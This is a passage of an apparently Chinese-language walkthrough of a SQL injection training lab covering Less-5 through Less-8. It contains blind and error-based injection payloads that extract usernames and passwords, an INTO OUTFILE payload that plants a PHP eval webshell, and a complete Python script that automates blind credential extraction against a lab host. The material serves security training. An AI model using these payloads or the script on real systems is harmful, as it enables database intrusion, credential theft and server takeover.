<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">这里也可以通过盲注去解决,先介绍一下盲注的命令</span><br><span class="line">- 试试盲注</span><br><span class="line">	介绍几个语法：</span><br><span class="line">	截取字符串： </span><br><span class="line">		left: Left ( string, n )  得到字符串左部指定个数的字符，</span><br><span class="line">		substr: substr(string, start, length) 和substring()函数一样，截取字符串，第一个为处理的字符串，开始位置，长度 </span><br><span class="line">		mid: MID(column_name,start[,length]) // 前两个字段为必须，length 为可选，选择开始字段，开始位置，截取长度。</span><br><span class="line">	ascii: 	返回字符串str的最左字符的数值,返回ascii值，0-255</span><br><span class="line">	length: 对字段长度破解，一般先对长度破解，然后在爆破字段值，这个一般采用二分法进行破解。</span><br><span class="line">	strcmp: 可以配合left 来使用，如果相等返回0 小于返回1 大于返回-1</span><br><span class="line">	regexp: 通过regexp 和 正则表达式来获取字段 这个时候 会匹配所有的字段，所以limit已经不起作用</span><br><span class="line">	</span><br><span class="line">	1&apos; and left(version(),1)=5 %23 // 判断当最左侧字符等于5时 返回you are in </span><br><span class="line">	1&apos; and left(version(),2)=5.%23 // 可以通过这样慢慢推出整个字段值</span><br><span class="line">	</span><br><span class="line">	使用substr 和ascii 来推出表名</span><br><span class="line">	1&apos; and ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1) &gt; 80 %23</span><br><span class="line">	尝试使用regexp</span><br><span class="line">	1&apos; and (select 1 from information_schema.columns where table_name = &apos;users&apos; and column_name regexp &apos;^pass[a-z]&apos; ;)=1 %23</span><br><span class="line">	使用 ord mid </span><br><span class="line">	ord 和ascii 一样</span><br><span class="line">	mid(column_name,start[,length]) // 从位置start开始，截取column_name字符串的length位，与substr作用相同</span><br><span class="line">	这里就类似ascii(substr) == ord(mid())</span><br><span class="line">	cast(username as char) 将 username 转成字符串</span><br><span class="line">	ifnull(exp1,exp2) exp1 不为null 则IFNULL()的返回值为exp1; 否则其返回值为exp2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。</span><br><span class="line">	1 &apos; and ord(mid((select ifnull (cast(username as char), 0x20) from security.users order by id limit 0,1),1,1)) = 127 %23</span><br></pre></td></tr></table></figure>

<h2 id="Less-6-双注入GET双引号字符型注入"><a href="#Less-6-双注入GET双引号字符型注入" class="headerlink" title="Less-6  双注入GET双引号字符型注入"></a>Less-6  双注入GET双引号字符型注入</h2><p>这道题和5类似，看一下源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos;.$id.&apos;&quot;&apos;; -- 虽然加了这么多  解读一下</span><br><span class="line">外层的单引号是做字符串用的，双引号是包含的， 里层的单引号是追加用的</span><br><span class="line">所以添加到查询语句中</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">这里的$id=&quot;$id&quot;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&quot;$id&quot; LIMIT 0,1&quot;;</span><br><span class="line">所以 这里还是双引号的注入</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-d35cb07daf8150ca?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"><br>做法和5基本类似，只是修改了一些闭合</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">	http://192.168.248.144:8080/Less-5/?id=1</span><br><span class="line">- 猜测注入类型</span><br><span class="line">	 You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br><span class="line"><span class="string">	 猜测语句</span></span><br><span class="line"><span class="string">	 select *  from users where id = "xxx" limit 0,1 ;</span></span><br><span class="line"><span class="string">- 尝试绕过</span></span><br><span class="line"><span class="string">	发现当结果正确时返回 you are in ...... 否则返回错误。</span></span><br><span class="line"><span class="string">	可以尝试报错注入 ，根据作者的意思，这题是一个双注</span></span><br><span class="line"><span class="string">	那么按照双注的步骤走</span></span><br><span class="line"><span class="string">- payload</span></span><br><span class="line"><span class="string">	//版本</span></span><br><span class="line"><span class="string">	1" union select count(*),2,concat_ws(char(58),(select version()) ,floor(rand(0)*2)) a from information_schema.schemata group by a %23</span></span><br><span class="line"><span class="string">	// 获取数据库</span></span><br><span class="line"><span class="string">	1" union all select count(*),1,concat('</span>~<span class="string">', (select schema_name from information_schema.schemata limit 4,1),floor(rand(0)*2)) a  from information_schema.schemata group by a %23</span></span><br><span class="line"><span class="string">	// 获取表</span></span><br><span class="line"><span class="string">	1 " union all select count(*),1,concat('</span>~<span class="string">',(select table_name from information_schema.tables where table_schema= database() limit 3,1),'</span>~<span class="string">',floor(rand(0)*2)) a  from information_schema.tables group by a %23</span></span><br><span class="line"><span class="string">	// 获取数据</span></span><br><span class="line"><span class="string">	1" union all select count(*),1,concat('</span>~<span class="string">',(select concat(username,password) from users limit 0,1),'</span>~<span class="string">',floor(rand(0)*2)) a  from information_schema.tables group by a %23</span></span><br></pre></td></tr></table></figure>

<p>尝试获取一下password</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-e451aeda9bf6fe94?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-7-导出文件GET字符型注入"><a href="#Less-7-导出文件GET字符型注入" class="headerlink" title="Less-7  导出文件GET字符型注入"></a>Less-7  导出文件GET字符型注入</h2><p>这道题是个新的题型，如果可以写入文件，那么我们最简单的是上传一句话马 菜刀直接连，就可以获取一个低权限的账户，所以如果在注入中存在此类问题，那也是比较危险的漏洞。</p>
<p>看看源码 是如何实现的，同样对于id没有进行过滤，可以通过’)) 绕过<br><img src="https://upload-images.jianshu.io/upload_images/18851353-5bed08d6963dc9c5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述">)<img src="https://upload-images.jianshu.io/upload_images/18851353-4faa63193977da4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>由于文件具有写的权限，所以可以通过into outfile 直接写入文件， 这里需要有几个条件，需要知道绝对路径写，，具有写的权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">	id=1</span><br><span class="line">	 You are in.... Use outfile......</span><br><span class="line">- 看来这题是要导出文件</span><br><span class="line">	sqlmap 也可以执行相同的工作 这里就不解释了。</span><br><span class="line">	使用outfile 写入到服务器，我们一般可以利用这个漏洞写入一句话马</span><br><span class="line">	这里需要有两个已知项 1 字段值 2 绝对地址</span><br><span class="line">	并且 系统必须有可读可写，在服务器上，完整的路径，</span><br><span class="line">	导出命令： union select 1,2,3 into outfile &quot;绝对地址&quot; %23</span><br><span class="line">- paylaod</span><br><span class="line">	// 一般web都存放在默认的目录下，比如：</span><br><span class="line">		1 c:/inetpub/wwwroot/</span><br><span class="line">		2 linux的nginx一般是/usr/local/nginx/html</span><br><span class="line">		3 /home/wwwroot/default</span><br><span class="line">		4 /usr/share/nginx</span><br><span class="line">		5 /var/www/html</span><br><span class="line">	然后 验证是否具有这几个条件</span><br><span class="line">	1 获取文件权限的可读</span><br><span class="line">	1&apos;)) and (select count(*) from mysql.user)&gt;0 %23</span><br><span class="line">	2 注入文件</span><br><span class="line">	这里要求猜一下他的绝对路径</span><br><span class="line">	id=-1&apos;)) union select 1,2,3 into outfile &quot;\\xxx\\1.txt&quot; %23</span><br><span class="line">	之后使用</span><br><span class="line">	id=-1&apos;)) union select 1,&quot;&lt;?php @eval($_POST[&apos;giantbranch&apos;]);?&gt;&quot; into outfile &quot;XXX\test.php&quot; %23</span><br><span class="line">	</span><br><span class="line">	这里由于是使用docker，没有写成功</span><br></pre></td></tr></table></figure>

<h2 id="Less-8-布尔型单引号GET盲注"><a href="#Less-8-布尔型单引号GET盲注" class="headerlink" title="Less-8 布尔型单引号GET盲注"></a>Less-8 布尔型单引号GET盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前面已经介绍过一次盲注，由于只有正确和错误，并不返回错误的信息，所以我们可以通过判断是否正确来猜测数据的值</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-访问</span><br><span class="line">	id=1</span><br><span class="line">	You are in...........</span><br><span class="line">- 测试返回内容</span><br><span class="line">	看起来只返回了you are in ....... 和空 。看来这题需要使用盲注了</span><br><span class="line">- 相关函数</span><br><span class="line">	之前已经说过一次，在简单提一下</span><br><span class="line">	length(str): 返回str字符串的长度</span><br><span class="line">	</span><br><span class="line">	substr(str,pos,len): 将str从pos位置开始截取len长度的字符串进行返回，注意这里的pos位置是从1开始的，不是数组的0开始</span><br><span class="line">	mid(str,pos,len): 同上</span><br><span class="line">	</span><br><span class="line">	ascii(str): 返回字符串str的最左边字符的ascii</span><br><span class="line">	ord(str): 同上</span><br><span class="line">	if(a,b,c): a 为条件，正确返回b 否则返回c</span><br><span class="line">	常见的ascii： A:65,Z:90 a:97,z:122,  0:48, 9:57</span><br><span class="line">	获取数据库长度</span><br><span class="line">	刚开始学，花了一天时间把脚本写好了，但是没有太完善就不发了，把简单的发一下</span><br><span class="line">	url = &quot;http://192.168.248.144:8080/Less-8/?id=&quot;</span><br><span class="line">	常规套路： 获取库，表，字段，下载数据</span><br><span class="line">	显示获取数目，然后是每个的长度，在是每个的值</span><br><span class="line">	获取数据库</span><br><span class="line">	1&apos; and length(database()) =&quot;+str(database_length)+&quot; %23&quot;</span><br><span class="line">	1&apos; and ascii(substr(database(),1))= 比较用的ascii值（0-128） %23&quot;</span><br><span class="line">	获取表</span><br><span class="line">	1&apos; and (select count(*) from information_schema.tables where table_schema=database())= 表的个数 %23</span><br><span class="line">	1&apos; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 这里写第几个表,1),1))=表的长度 %23</span><br><span class="line">	1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+第几个表+&quot;,1),&quot;+表的第几个字母&quot;,1)) =ascii值（0-128） %23</span><br><span class="line">	字段和他类似</span><br><span class="line">	数据，选一个写</span><br><span class="line">	1&apos; and (select count(*) from users )= 个数 %23</span><br><span class="line">	1&apos; and length(substr((select username from users limit 第几个数据,1),1))=数据的长度 %23</span><br><span class="line">	1&apos; and ascii(substr((select &quot;+value+&quot; from users limit 第几个数据,1),数据的第几位,1)) =ascii 值 %23</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">这里上一下写的py脚本</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.64.135/Less-8/?id="</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 查数据库</span></span><br><span class="line"><span class="comment"># def length():</span></span><br><span class="line">database_length = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">"1' and length(database()) ="</span>+str(database_length)+<span class="string">" #"</span></span><br><span class="line">    response = request.urlopen(url+ parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>,response)):</span><br><span class="line">        <span class="comment">#print("DATABASE_LENGTH:"+str(database_length))</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        database_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># db_name = ""</span></span><br><span class="line"><span class="comment"># for l in range(database_length):</span></span><br><span class="line"><span class="comment">#     for a in range(128):</span></span><br><span class="line"><span class="comment">#         param = "1' and ascii(substr(database(),"  +  str(l+1) +  "))="  +  str(a) +  "#"</span></span><br><span class="line"><span class="comment">#         response = request.urlopen(url + parse.quote(param)).read().decode()</span></span><br><span class="line"><span class="comment">#         if (re.search("You are in",response)):</span></span><br><span class="line"><span class="comment">#             db_name += chr(a)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print("[*]:"+db_name)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#尝试二分法扫描</span></span><br><span class="line">db_name = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(database_length):</span><br><span class="line">    a,b = <span class="number">64</span>,<span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b = int(b/<span class="number">2</span>)</span><br><span class="line">        param = <span class="string">"1' and ascii(substr(database(),"</span>  +  str(l+<span class="number">1</span>) +  <span class="string">"))&lt;"</span>  +  str(a) +  <span class="string">"#"</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>,response)):</span><br><span class="line">            a -=b</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = <span class="string">"1' and ascii(substr(database(),"</span>+str(l+<span class="number">1</span>)+<span class="string">")) ="</span>+str(a)+<span class="string">" #"</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>,response)):</span><br><span class="line">                db_name += chr(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a +=b</span><br><span class="line">print(<span class="string">"db_name:"</span>+ db_name)</span><br><span class="line">print(<span class="string">'table:'</span>)</span><br><span class="line"><span class="comment">#2 查表数量</span></span><br><span class="line">table_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">"1' and (select count(*) from information_schema.tables where table_schema=database())="</span>+str(table_num)+<span class="string">" #"</span></span><br><span class="line">    response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>,response)):</span><br><span class="line">        <span class="comment">#print("table_num:"+str(table_num))</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查 表长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ta_length</span><span class="params">(num)</span>:</span></span><br><span class="line">    table_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = <span class="string">"1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit "</span>+str(num)+<span class="string">",1),1))="</span>+str(table_length)+<span class="string">" #"</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>,response)):</span><br><span class="line">            <span class="keyword">return</span> table_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            table_length += <span class="number">1</span></span><br><span class="line"><span class="comment"># 查表</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(table_num):</span><br><span class="line">    table_name =<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> l  <span class="keyword">in</span> range(ta_length(n)): <span class="comment"># 表的长度</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">            param = <span class="string">"1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "</span>+str(n)+<span class="string">",1),"</span>+str(l+<span class="number">1</span>)+<span class="string">",1)) ="</span>+str(a)+<span class="string">" #"</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>, response)):</span><br><span class="line">                table_name += chr(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"[*]:"</span> + table_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 查字段</span></span><br><span class="line"><span class="comment"># 查字段个数</span></span><br><span class="line">columns_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">"1' and (select count(*) from information_schema.columns where table_name='users')="</span>+str(columns_num)+<span class="string">" #"</span></span><br><span class="line">    response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>,response)):</span><br><span class="line">        print(<span class="string">"columns:"</span>+str(columns_num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        columns_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查每个字段的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">co_length</span><span class="params">(num)</span>:</span></span><br><span class="line">    columns_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = <span class="string">"1' and length(substr((select column_name from information_schema.columns where table_name='users' limit "</span>+str(num)+<span class="string">",1),1))="</span>+str(columns_length)+<span class="string">" #"</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>,response)):</span><br><span class="line">            <span class="comment">#print(columns_length)</span></span><br><span class="line">            <span class="keyword">return</span> columns_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            columns_length += <span class="number">1</span></span><br><span class="line"><span class="comment"># 查每个字段的值</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(columns_num):</span><br><span class="line">    columns_name =<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> l  <span class="keyword">in</span> range(co_length(n)): <span class="comment"># 表的长度</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">            param = <span class="string">"1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit "</span>+str(n)+<span class="string">",1),"</span>+str(l+<span class="number">1</span>)+<span class="string">",1)) ="</span>+str(a)+<span class="string">" #"</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>, response)):</span><br><span class="line">                columns_name += chr(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"[*]:"</span> +columns_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查 username</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">"1' and (select count(*) from users )= "</span>+str(num)+<span class="string">"#"</span></span><br><span class="line">    response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>,response)):</span><br><span class="line">        print(<span class="string">"num:"</span>+str(num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(num)</span>:</span></span><br><span class="line">    user_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = <span class="string">"1' and length(substr((select username from users limit "</span>+str(num)+<span class="string">",1),1))="</span>+str(user_length)+<span class="string">" #"</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>,response)):</span><br><span class="line">            <span class="comment">#print(user_length)</span></span><br><span class="line">            <span class="keyword">return</span> user_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_length += <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Name</span><span class="params">(value1,value2)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</span><br><span class="line">        columns_name =<span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> l  <span class="keyword">in</span> range(length(n)): <span class="comment"># 表的长度</span></span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">                param = <span class="string">"1' and ascii(substr((select "</span>+value1+<span class="string">" from users limit "</span>+str(n)+<span class="string">",1),"</span>+str(l+<span class="number">1</span>)+<span class="string">",1)) ="</span>+str(a)+<span class="string">" #"</span></span><br><span class="line">                response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">                <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>, response)):</span><br><span class="line">                    columns_name += chr(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">"[*]:"</span> +columns_name,end=<span class="string">":"</span>)</span><br><span class="line">        columns_name2 = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(length(n)):  <span class="comment"># 表的长度</span></span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">128</span>):  <span class="comment"># 爆破表</span></span><br><span class="line">                param = <span class="string">"1' and ascii(substr((select "</span> + value2 + <span class="string">" from users limit "</span> + str(n) + <span class="string">",1),"</span> + str(</span><br><span class="line">                    l + <span class="number">1</span>) + <span class="string">",1)) ="</span> + str(a) + <span class="string">" #"</span></span><br><span class="line">                response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">                <span class="keyword">if</span> (re.search(<span class="string">"You are in"</span>, response)):</span><br><span class="line">                    columns_name2 += chr(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print(columns_name2)</span><br><span class="line">Name(<span class="string">"username"</span>,<span class="string">"password"</span>)</span><br></pre></td></tr></table></figure>

<p>成功获取到了数据库的值，<br><img src="https://upload-images.jianshu.io/upload_images/18851353-e3083873d730a225.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
